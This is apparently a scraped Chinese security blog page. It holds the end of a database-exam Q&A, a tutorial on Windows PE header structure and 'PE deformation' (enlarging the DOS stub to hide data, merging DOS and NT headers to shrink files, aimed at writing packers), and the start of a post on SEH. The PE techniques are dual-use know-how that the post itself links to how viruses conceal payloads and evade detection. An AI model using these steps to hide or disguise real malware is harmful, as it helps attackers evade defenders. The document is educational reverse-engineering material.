<li>参照完整性主要是foreign key，当某个attr reference了另外relation的attr时，删除和插入都需要进行完整性检查</li>
</ul>
<p><strong>7、在关系表中，主码的概念体现在其值的非空和xx两个特性</strong></p>
<p><em>唯一</em></p>
<p>太简单不解释了</p>
<h2 id="简答题"><a href="#简答题" class="headerlink" title="简答题"></a>简答题</h2><p><strong>1、数据模式的三要素是什么？</strong></p>
<p>数据模式也叫做数据模型主要有三部分组成</p>
<ul>
<li>数据结构：数据结构主要描述数据的类型、内容、性质、以及数据之间的联系，是整个数据模型的基础，而针对数据的操作和数据之间的约束都是建立在数据结构的基础上的；</li>
<li>数据操作：主要定义了在相应的数据结构上的操作类型和操作方式（数据库中的增删改查等）；</li>
<li>数据约束：数据约束主要用来描述数据库中数据结构之间的语法、词义联系以及彼此之间的相互约束和制约关系（如MySQL中使用外键保证数据之间的数据完整性）；</li>
</ul>
<p><strong>2、什么是强制存储控制MAC</strong></p>
<p>用户的权限和客体的安全属性都是系统管理员人为设置，或由操作系统自动地按照严格的安全策略与规则进行设置，用户和他们的进程不能修改这些属性。</p>
<p>每一个数据对象被（强制地）标以一定的密集，每一个用户也被（强制地）授予某一个级别的许可证。系统规定只有具有谋一许可证级别的用户才能存取某一个密级的数据对象</p>
<p><strong>3、关系模型中实体完整性规则和参照完整性规则分别是什么？</strong></p>
<p>实体完整性：如果A是二维表的主码，那么A不能为空。 （若属性A是基本关系R的主属性，则属性A不能取空值）</p>
<p>参照完整性：如果F是外码，那么他要么是空值，要么就是另一个表的主码.<br>（若属性（或属性组）F是基本关系R的外码，它与基本关系S的主码相对应（基本关系R和S不一定是不同的关系），则对于R中每个元祖在F上必须为：</p>
<ol>
<li>取空值（F的每个属性均为空值）</li>
<li>等于S中某个tuple的主码值</li>
</ol>
<p><strong>4、并发控制会引起哪些不一致？</strong></p>
<p>丢失修改；不可重复读；读”脏”数据</p>
<p><strong>5、是什么是两段锁协议？</strong></p>
<p>所有transaction必须分两个阶段对数据项加锁和解锁</p>
<ol>
<li>在对任何数据进行读写操作之前，首先要申请并获得对该数据的封锁。</li>
<li>在释放一个封锁之后，事务不再申请和获得任何其他封锁。</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/30/Windows调试艺术——PE文件变形（一）/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/30/Windows调试艺术——PE文件变形（一）/" itemprop="url">Windows调试艺术——PE文件变形（一）调试艺术</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-30T11:18:06+08:00">
                2019-05-30
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Windows调试艺术/" itemprop="url" rel="index">
                    <span itemprop="name">Windows调试艺术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>文章在360的安全客上首发，搬运到自己博客上来，可以去安全客查看详细博文。</p>
<h1 id="Windows调试艺术——PE文件变形（一）"><a href="#Windows调试艺术——PE文件变形（一）" class="headerlink" title="Windows调试艺术——PE文件变形（一）"></a>Windows调试艺术——PE文件变形（一）</h1><p>上次的文章中我们着重探讨了导入函数和导出函数的具体过程，实际上也潜在地分析了PE文件的大部分结构，比如：导入表、导出表、延迟绑定表等等，这篇文章就把剩余的PE结构进行一下详细的总结，并在我们已经学过的知识的基础上进行简单的PE变形技术，为我们后期写壳做好充分准备。</p>
<p>阅读本篇前建议阅读：<br><a href="https://www.anquanke.com/post/id/177462" target="_blank" rel="noopener">Windows调试艺术——导入函数和导出函数</a></p>
<p>说起header大家应该都不陌生，jpg有jpg的头，zip有zip的头，http传输中有http头，特别是在ctf比赛中header更是“重灾区”，经常被拿来做手脚。头实际上就是起到了总览和标记的作用。所谓标记也就是标示这个文件是个啥，是pe还是zip，起到了分类的作用；所谓总览就是把文件的一些整体性的、重要的信息放进来。如此可见头的重要性。</p>
<p>我们还是通过一张笔者自制的图来总体浏览一下头的结构<br><img src="https://raw.githubusercontent.com/Asa9ao/pic/master/20190506174901.png" alt=""><br>可以看到PE的头主要由Dos header、nt_header两部分组成，我们一点一点看</p>
<p>##Image_Dos_Header &amp;&amp; Dos_Stub介绍和变形技术<br>看到dos就知道这些是“老古董”，它主要是为了兼容MS-DOS操作系统，stub其实就是在dos环境下的代码段，header其实就是dos环境下的头，实际上在dos操作系统上，我们可以认为pe文件就是Image_Dos_Header和Dos_Stub组成的文件，其他是“垃圾数据”。<br>dos_header结构体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>        </span><br><span class="line">WORD   e_magic;                         <span class="comment">// Magic number  </span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file  </span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file  </span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations  </span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs  </span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed  </span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed  </span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value  </span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value  </span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum  </span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value  </span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value  </span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table  </span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number  </span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words  </span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)  </span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific  </span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words  </span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header  </span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure></p>
<p>虽说是为了兼容Dos的老古董，但它的某些结构我们还是需要了解的。magic是魔术字，它的值固定为0x4D5A，实现的就是上面提到的标记的作用。第二个需要关心的就是最后的e_lfanew，它实际上是NT头的偏移，因为Dos部分的大小是不确定的，PE加载器要通过这个字段来找到NT头。<br><img src="https://raw.githubusercontent.com/Asa9ao/pic/master/20190506203052.png" alt=""><br>如图所示，lfanew的值为00 00 00 80，0+80=80，而80处正是NT头的起始位置。</p>
<p>实际上，我们经常通过对这部分的修改来实现PE变形，只知道这些字段的意思还远远不够，我们必须知道哪些部分能动，哪些部分不能动才能实现操作，例如：我们可以在Dos头中藏入密钥实现解密，加入效验位检查文件是否被篡改，病毒文件还可以通过在此处设置标志位来检验文件是否已经被感染等。<br>这里作者尝试修改了每一项的数据进行测试，结论是——除了lfanew和magic以外的字段可以随意修改。</p>
<p>Dos_Stub也就是Dos程序的代码段，默认情况下我们编写的PE程序都会自动添上一段Dos代码，功能很简单：打印一句话。当然我们可以在大小范围内随意修改，只要你会写Dos。<br>但由于在windows上Stub并不会运行，所以，我们可以将敏感数据甚至是别的程序（病毒经常会采取这样的手段，后期再将程序释放出来）藏在这里。那这样我们就需要扩充Stub的大小了，Dos_Header的lfanew是NT头的偏移，而Dos头的大小是固定的，我们修改了它就相当于是修改了Stub的大小。下面我们就来实际试一下，程序仍沿用上次文章中的test。</p>
<ul>
<li>修改lfanew的值，这里我们就改成1080好了（因为1000恰好是4kb，也就是1个页的大小）<br><img src="https://raw.githubusercontent.com/Asa9ao/pic/master/20190507160336.png" alt=""></li>
<li>修改Image_Optional_Header的AddressOfEntryPoint，虽然还没讲到这部分，大家可以根据010Editor的提示先进行修改，这其实就是程序的入口点，因为之后我们要把后面的内容整体往后移1000h，所以实际上入口点的偏移（这里要注意，包括下边提到的字段大都是RVA，并不是具体的值，加1000不是说入口点的值加了1000，而是入口点对应的偏移往后偏移了1000，详细的计算之前的文章提到过了，读者可自行证明）也需要加1000h<br><img src="https://raw.githubusercontent.com/Asa9ao/pic/master/20190507160644.png" alt=""></li>
<li>修改Image_Optional_Header的SizeOfImage，这是整个映像的大小，同样要加1000<br><img src="https://raw.githubusercontent.com/Asa9ao/pic/master/20190507161234.png" alt=""></li>
<li>修改Image_Optional_Header的SizeOfHeaders，同样加1000，这里的值并不是RVA了，而是头部的大小，所以加1000的意思就是加了1000的大小<br><img src="https://raw.githubusercontent.com/Asa9ao/pic/master/20190507161708.png" alt=""></li>
<li>Image_Section_Header的VirtualAddress和PointerToRawData，同样加1000，这里有好几个节头，就不再一一放截图了</li>
<li>调整Image_Optional_Header的Image_Data_Directory中各个表的virtualAddress以及对应的表的RVA内容，此处要修改的内容较多，建议参考上一篇文章的进行修改。</li>
<li>复制原来Stub之后所有的内容到新lfanew的偏移<br><img src="https://raw.githubusercontent.com/Asa9ao/pic/master/20190507162420.png" alt=""><br>好了，大功告成，保存后运行，程序一切正常，完美！</li>
</ul>
<p>##Image_NT_Header介绍和变形技术<br>此结构是程序在Windows中运行的真实头部，主要有三部分构成：Signatrue如同Dos的magic，他也是起到了标志的作用，值固定为0x4550，也就是字母PE；Image_File_Header是文件头的意思，它保存着最基本的信息；Image_Optional_Header我们已经打过交道了，可以看到它保存着各种重要的信息，有的书将它译作“可选头”，但显然它必须有，而不是“可选”，所以我一般叫它拓展头。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span>  </span><br><span class="line">    WORD    Machine;  </span><br><span class="line">    WORD    NumberOfSections;  </span><br><span class="line">    DWORD   TimeDateStamp;  </span><br><span class="line">    DWORD   PointerToSymbolTable;  </span><br><span class="line">    DWORD   NumberOfSymbols;  </span><br><span class="line">    WORD    SizeOfOptionalHeader;  </span><br><span class="line">    WORD    Characteristics;  </span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure></p>
<p>首先来看文件头，各个字段含义如下：</p>
<ul>
<li>Machine是指程序运行的cpu平台，AMD还是Intel，一般不需要关心</li>
<li>NumberOfSections是程序中节的数量</li>
<li>TimeDateStamp是时间戳，一般是链接器帮我们填写的，之前windbg调试时我们曾用它作为标志来检验我们找的偏移是否正确</li>
<li>PointerToSymbolTable，COFF文件符号表在文件中的偏移</li>
<li>NumberOfSymbols，符号的数量</li>
<li>SizeOfOptionalHeader，后续扩展头的大小</li>
<li>Characteristics，PE文件的属性，这个较为复杂，这里给出详细的表单，不再做过多说明，需要时可对照010Editor进行查看</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  // Relocation info stripped from file.  </span><br><span class="line">#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  // File is executable  (i.e. no unresolved externel references).  </span><br><span class="line">#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  // Line nunbers stripped from file.  </span><br><span class="line">#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  // Local symbols stripped from file.  </span><br><span class="line">#define IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  // Agressively trim working set  </span><br><span class="line">#define IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  // App can handle &gt;2gb addresses  </span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  // Bytes of machine word are reversed.  </span><br><span class="line">#define IMAGE_FILE_32BIT_MACHINE             0x0100  // 32 bit word machine.  </span><br><span class="line">#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  // Debugging info stripped from file in .DBG file  </span><br><span class="line">#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  // If Image is on removable media, copy and run from the swap file.  </span><br><span class="line">#define IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  // If Image is on Net, copy and run from the swap file.  </span><br><span class="line">#define IMAGE_FILE_SYSTEM                    0x1000  // System File.  </span><br><span class="line">#define IMAGE_FILE_DLL                       0x2000  // File is a DLL.  </span><br><span class="line">#define IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  // File should only be run on a UP machine  </span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  // Bytes of machine word are reverse</span><br></pre></td></tr></table></figure>
<p>可以看到文件头并不复杂，实际上大多数的重要数据都是在扩展头里的，下面就来看一下扩展头的结构<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span>  </span><br><span class="line">    WORD    Magic;  </span><br><span class="line">    BYTE    MajorLinkerVersion;  </span><br><span class="line">    BYTE    MinorLinkerVersion;  </span><br><span class="line">    DWORD   SizeOfCode;  </span><br><span class="line">    DWORD   SizeOfInitializedData;  </span><br><span class="line">    DWORD   SizeOfUninitializedData;  </span><br><span class="line">    DWORD   AddressOfEntryPoint;  </span><br><span class="line">    DWORD   BaseOfCode;  </span><br><span class="line">    DWORD   BaseOfData;  </span><br><span class="line">    DWORD   ImageBase;  </span><br><span class="line">    DWORD   SectionAlignment;  </span><br><span class="line">    DWORD   FileAlignment;  </span><br><span class="line">    WORD    MajorOperatingSystemVersion;  </span><br><span class="line">    WORD    MinorOperatingSystemVersion;  </span><br><span class="line">    WORD    MajorImageVersion;  </span><br><span class="line">    WORD    MinorImageVersion;  </span><br><span class="line">    WORD    MajorSubsystemVersion;  </span><br><span class="line">    WORD    MinorSubsystemVersion;  </span><br><span class="line">    DWORD   Win32VersionValue;  </span><br><span class="line">    DWORD   SizeOfImage;  </span><br><span class="line">    DWORD   SizeOfHeaders;  </span><br><span class="line">    DWORD   CheckSum;  </span><br><span class="line">    WORD    Subsystem;  </span><br><span class="line">    WORD    DllCharacteristics;  </span><br><span class="line">    DWORD   SizeOfStackReserve;  </span><br><span class="line">    DWORD   SizeOfStackCommit;  </span><br><span class="line">    DWORD   SizeOfHeapReserve;  </span><br><span class="line">    DWORD   SizeOfHeapCommit;  </span><br><span class="line">    DWORD   LoaderFlags;  </span><br><span class="line">    DWORD   NumberOfRvaAndSizes;  </span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];  </span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>Magic代表拓展头的类型，0x10b是32位的，0x20b是64位的。</li>
<li>MajorLinkerVersion和MinorLinkerVersion是链接器版本的高位和低位</li>
<li>SizeOfCode为代码段的总的大小</li>
<li>SizeOfInitializedData是初始化了的数据的大小</li>
<li>SizeOfUninitializedData是未初始化的数据的大小</li>
<li>AddressOfEntryPoint是程序的入口点的RVA，当然这里要说明，不同的编译器编译出来的入口点千差万别，可千万不要以为这就是main函数了</li>
<li>BaseOfCode为代码段的起始地址</li>
<li>BaseOfData为数据段的起始地址</li>
<li>ImageBase是加载的推荐基地址，前面我们在重定位表中提到过了</li>
<li>SectionAlignment，节对齐，假如这个值是0x1000，那么每个节的起始地址的低12位都为0。如果做过pwn的同学应该很熟悉</li>
<li>FileAlignment，节在文件中的对齐，由于PE从文件到内存可以看作是一个放大的过程，所以SectionAlignment的值是一定要大于FileAlignment</li>
<li>MajorOperatingSystemVersion&amp;&amp;MinorOperatingSystemVersion，操作系统的版本号，和上面的链接器一样，是高位和地位</li>
<li>MajorImageVersion、MinorImageVersion，pe的版本号，是开发者自己制定的</li>
<li>MajorSubsystemVersion、MinorSubsystemVersion，子系统的版本号，所谓的子系统可以看作是Windows为了兼容某些程序而特意准备的虚拟环境，在64位的Windows上使用32程序实际上就是用了WOW64（Windows-on-Windows 64-bit）的子系统</li>
<li>Win32VersionValue，保留的标志位，必须为0</li>
<li>SizeOfImage，pe占用虚拟内存的大小</li>
<li>SizeOfHeaders，所有头的大小，上面我们在修改Dos Stub的时候实际上修改过了</li>
<li>CheckSum，映象文件的校验和，我们在《Windows调试艺术——断点和反调试》中用到了相似的技巧来检测是否有断点指令0xcc，而在这实际上就是看看文件有没有被篡改过</li>
<li>Subsystem，指定的子系统，上面说过了</li>
<li>DllCharacteristics，dll文件的属性，非常复杂，现阶段不需要了解</li>
<li>SizeOfStackReserve，线程的栈的保留内存的大小</li>
<li>SizeOfStackCommit，线程的栈的占用内存的大小</li>
<li>SizeOfHeapReserve&amp;&amp;SizeOfHeapCommit：同上</li>
<li>LoaderFlags，保留，必须为0。</li>
<li>NumberOfRvaAndSizes，这是DataDirectory里保存的表项的数量</li>
<li>DataDirectory，上一篇《Windows调试艺术》已经详细讲过了</li>
</ul>
<p>到这我们就详细看完了NT头的所有内容，和Dos头不同，NT头的内容确确实实和我们的程序运行密切相关，所以想和Dos头那样随心所欲的改是不可能了，但其实也正是因为它对程序的重大影响，让我们有更多的可玩空间。</p>
<p>还是让我们来看看NT头中有哪些可以随意修改的空间，以下为笔者测试得到的通用结果，在不同版本Windows上可能还有其他可用的，大家感兴趣的话可以在自己系统上进行尝试。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">File Header</span><br><span class="line">DWORD   TimeDateStamp;  <span class="comment">//时间戳自然是随意修改</span></span><br><span class="line">DWORD   PointerToSymbolTable;  <span class="comment">//程序运行时不需要符号</span></span><br><span class="line">DWORD   NumberOfSymbols;    <span class="comment">//同上</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Optional Header</span><br><span class="line">BYTE    MajorLinkerVersion;  <span class="comment">//链接器的版本自然和程序执行没关系</span></span><br><span class="line">BYTE    MinorLinkerVersion;  </span><br><span class="line">DWORD   SizeOfCode;         <span class="comment">//大小够大就行了</span></span><br><span class="line">DWORD   SizeOfInitializedData;  </span><br><span class="line">DWORD   SizeOfUninitializedData;</span><br></pre></td></tr></table></figure>
<p>上面对于Dos我们试了试空间扩充，那这次就来搞一下空间压缩，对于病毒来说这是至关重要的，毕竟100多m的恶意程序可太好发现了，病毒作者总是想方设法的想要缩小空间的。</p>
<p>最简单当然是指定对齐的大小SectionAlignment和 FileAlignment了，我们常常可以在程序中看到大片的00，这些数据实际上是用来填充实现程序的对齐的，如果我们将这个对齐的值改的小一点是不是就可以避免大量的补00了呢？我们可以通过链接器的/OPT:NOWIN98将section的对齐由标准的4k改为512字节，这样能一定程度上压缩程序大小。</p>
<p>合并也是常见的压缩手段，其中最重要的一种思路就是合并头，因为Dos Header和Dos Stub其实在Windows上是不需要的，我们可以通过覆盖的方式让Dos头和Optional头合二为一。<br><img src="https://raw.githubusercontent.com/Asa9ao/pic/master/20190511154323.png" alt=""><br>原理很简单，就是因为DOS头的lfanew指向的是PE头，我们可以将它指定为Dos头的一部分，又因为DOS头的大部分数据是可改的，所以可以随意填充NT Header的内容，注意lfanew所在的字段就是nt header的一部分了，所以它的位置就必须是NT头中可以随意指定的。过程如下：</p>
<ul>
<li>首先选择我们要设置lfanew的位置，该位置必须是NT头中可任意修改的，这里我们选择SizeOfCode<br><img src="https://raw.githubusercontent.com/Asa9ao/pic/master/20190511161657.png" alt=""></li>
<li><p>计算偏移值，原本的NT头从0x80开始，所以偏移为0x1c，要把它作为lfanew的话需要让它变为DOS的0x30，所以起始的NT头应该在0x20处</p>
</li>
<li><p>将原来的DOS头0x20后0xF8大小（即NT头的大小）的内容全部删除，然后将复制的PE头粘贴上去<br><img src="https://raw.githubusercontent.com/Asa9ao/pic/master/20190511162949.png" alt=""></p>
</li>
<li><p>可以看到值为E0也就是SizeOfCode了，修改为0x20即可</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Asa9ao/pic/master/20190511163107.png" alt=""></p>
<p>上述操作实现的映射关系如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dos.reserved  ----&gt; NT header</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">dos.lfanew   ----&gt; Optional.SizeOfCode</span><br></pre></td></tr></table></figure>
<p>当然实现怎么样的映射就全凭你喜欢了，只要遵守上面的做法即可。不过有一点需要注意——我们需要拿自己的数据去填满删除的部分，或者按照Dos头变形中的Dos Stub扩展的方法去修改几个重要的结构，否则会因为文件偏移改变而导致程序不能执行。</p>
<h3 id="需要注意的内容"><a href="#需要注意的内容" class="headerlink" title="需要注意的内容"></a>需要注意的内容</h3><p>在修改PE文件时很容易因为修改了文件大小而导致文件的偏移需要修改，比如代码本来文件中0x100的位置，你对文件变形后0x100变成了自己的数据，那就乱套了，所以有一些数据必须要十分注意，这里为大家整理出来：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">OptionalHeader:</span><br><span class="line">DWORD   AddressOfEntryPoint; </span><br><span class="line">DWORD   BaseOfCode;  </span><br><span class="line">DWORD   BaseOfData; </span><br><span class="line">IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DosHeader:</span><br><span class="line">LONG   e_lfanew;  </span><br><span class="line"></span><br><span class="line">FileHeader:</span><br><span class="line">DWORD    NumberOfSections; </span><br><span class="line">DWORD    SizeOfOptionalHeader;</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/29/windows调试艺术—从0开始的异常处理（下）/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/29/windows调试艺术—从0开始的异常处理（下）/" itemprop="url">Windows调试艺术——从0开始的异常处理（下）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-29T11:18:06+08:00">
                2019-05-29
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Windows调试艺术/" itemprop="url" rel="index">
                    <span itemprop="name">Windows调试艺术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>文章在360的安全客上首发，搬运到自己博客上来，可以去安全客查看详细博文。</p>
<h1 id="Windows调试艺术——从0开始的异常处理（下）"><a href="#Windows调试艺术——从0开始的异常处理（下）" class="headerlink" title="Windows调试艺术——从0开始的异常处理（下）"></a>Windows调试艺术——从0开始的异常处理（下）</h1><p>windows调试艺术主要是记录我自己学习的windows知识，并希望尽可能将这些东西在某些实际方面体现出来。</p>
<p>要阅读本文章的小伙伴建议先看看《windows调试艺术》的前两篇文章来了解一下前置知识</p>
<p><a href="https://www.anquanke.com/post/id/175293" target="_blank" rel="noopener">Windows调试艺术——从0开始的异常处理（上）</a></p>
<p><a href="https://www.anquanke.com/post/id/173586" target="_blank" rel="noopener">Windows调试艺术——利用LDR寻找dll基址</a></p>
<p>上一篇我们详细的了解了windows对于硬件和软件异常的不同处理过程以及相似的分发机制，但windows的异常管理远没有那么简单，还包括了SEH、VEH、安全措施等的重要知识，这次就来进行一下补充。要特别说明一下，作为windows最核心的部分之一，异常的大部分内容微软并没有公布，在加之笔者水平有限，所以在一些地方的了解还有很多欠缺，希望有能力的朋友能提出和我共同将windows异常这部分的内容总结完善。</p>
<p>##SEH</p>
<p>SEH（structure exception handle）即结构化异常处理，往大了说它是整个Windows异常处理体系的一种称呼，往小了说它是维护异常体系的一个具体结构。在之前的文中提到了FS寄存器的0偏移直接指向了TEB，TEB的第一个结构是TIB，而TIB的0也就是ExceptionList，也就是异常处理链表的头节点，其结构如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span></span><br><span class="line">  PEXCEPTION_ROUTINE Handler;</span><br><span class="line">&#125;EXCEPTION_REGISTRATION_RECORD</span><br></pre></td></tr></table></figure>
